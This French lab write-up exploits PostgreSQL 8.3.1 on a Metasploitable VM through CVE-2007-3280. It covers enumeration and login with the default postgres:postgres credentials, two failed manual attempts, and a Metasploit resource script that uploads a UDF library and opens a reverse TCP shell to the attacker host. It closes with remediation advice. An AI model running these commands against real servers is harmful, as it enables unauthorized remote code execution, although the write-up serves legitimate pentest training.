PostgreSQL 8.3.1 — RCE via bibliothèque UDF compilée

Deux tentatives manuelles réfutées avant de comprendre le vrai mécanisme : compilation d'une .so avec le bon magic block

Service / PortPostgreSQL 8.3.1 — port 5432
CibleMetasploitable 1 — 192.168.56.102
CVECVE-2007-3280
RésultatShell distant en tant que postgres

Note réseau. Cette page utilise le réseau de Josaphat (vboxnet0) : cible 192.168.56.102, Kali 192.168.56.1. Côté Jules, le même service est sur 172.28.128.4.

1. Identification

$ nmap -sC -sV -p 5432 192.168.56.102
5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7

$ PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "SELECT version(); SELECT usename, usesuper FROM pg_user WHERE usename='postgres';"
PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
 usename  | usesuper
----------+----------
 postgres | t

PostgreSQL 8.3.1, identifiants par défaut postgres:postgres fonctionnels, compte superuser — condition nécessaire pour la suite.

2. Méthode d'identification de la CVE et du module

Tentative n°1 — COPY ... TO PROGRAM (ne s'applique pas).

$ PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "COPY (SELECT 1) TO PROGRAM 'id';"
ERROR:  syntax error at or near "PROGRAM"

COPY ... TO PROGRAM a été introduit en PostgreSQL 9.3 (2013). La cible est en 8.3.1 (2008), largement antérieure.

Tentative n°2 — fonction C depuis la libc (bloquée).

$ PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "CREATE OR REPLACE FUNCTION sys_exec(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;"
ERROR:  incompatible library "/lib/libc.so.6": missing magic block
ASTUCE : Extension libraries are required to use the PG_MODULE_MAGIC macro.

PostgreSQL exige depuis la 8.2 que toute bibliothèque C chargée déclare un "magic block" (PG_MODULE_MAGIC) — la libc brute n'a pas ce marqueur.

$ msfconsole -q -x "info exploit/linux/postgres/postgres_payload; exit"
Description:
  On some default Linux installations of PostgreSQL, the postgres
  service account may write to the /tmp directory, and may source UDF
  Shared Libraries from there as well, allowing execution of arbitrary code.
References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-3280
Mécanisme réel. CVE-2007-3280. Le module ne charge pas une lib système quelconque (ce qui expliquait les deux échecs précédents) : il compile sa propre bibliothèque partagée, correctement marquée avec PG_MODULE_MAGIC pour la version exacte du serveur cible, l'écrit dans /tmp (accessible en écriture par le compte postgres) via les fonctions de large objects, puis la charge comme fonction UDF pour exécuter le payload.

3. Démarche d'exploitation

$ cat > /tmp/postgres.rc << 'EOF'
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.56.102
set USERNAME postgres
set PASSWORD postgres
set PAYLOAD linux/x86/shell/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4447
exploit -z
EOF
$ msfconsole -q -r /tmp/postgres.rc
[*] 192.168.56.102:5432 - Uploaded as /tmp/wltnxZOA.so, should be cleaned up automatically
[*] Sending stage (36 bytes) to 192.168.56.102
[*] Command shell session 1 opened (192.168.56.1:4447 -> 192.168.56.102:40931)

La ligne Uploaded as /tmp/wltnxZOA.so confirme exactement le mécanisme lu dans la description du module : une .so compilée à la volée, déposée dans /tmp.

4. Preuve d'accès obtenu

sessions -i 1 -c id
uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)

Shell confirmé en tant que postgres. Pas root : l'élévation de privilèges sera une étape distincte.

5. Remédiation

RECOMMANDATIONS
  • Changer le mot de passe par défaut (postgres:postgres) — cause racine de l'accès initial.
  • Mettre à jour PostgreSQL : la 8.3.1 (2008) est très obsolète.
  • Restreindre les droits du compte système postgres : il ne devrait pas pouvoir écrire dans des répertoires partagés comme /tmp qui servent ensuite de point de chargement pour des bibliothèques UDF arbitraires (cœur de CVE-2007-3280).
  • Restreindre l'accès réseau à PostgreSQL (pg_hba.conf, pare-feu).
  • Révoquer le statut superuser des comptes applicatifs dès que possible.
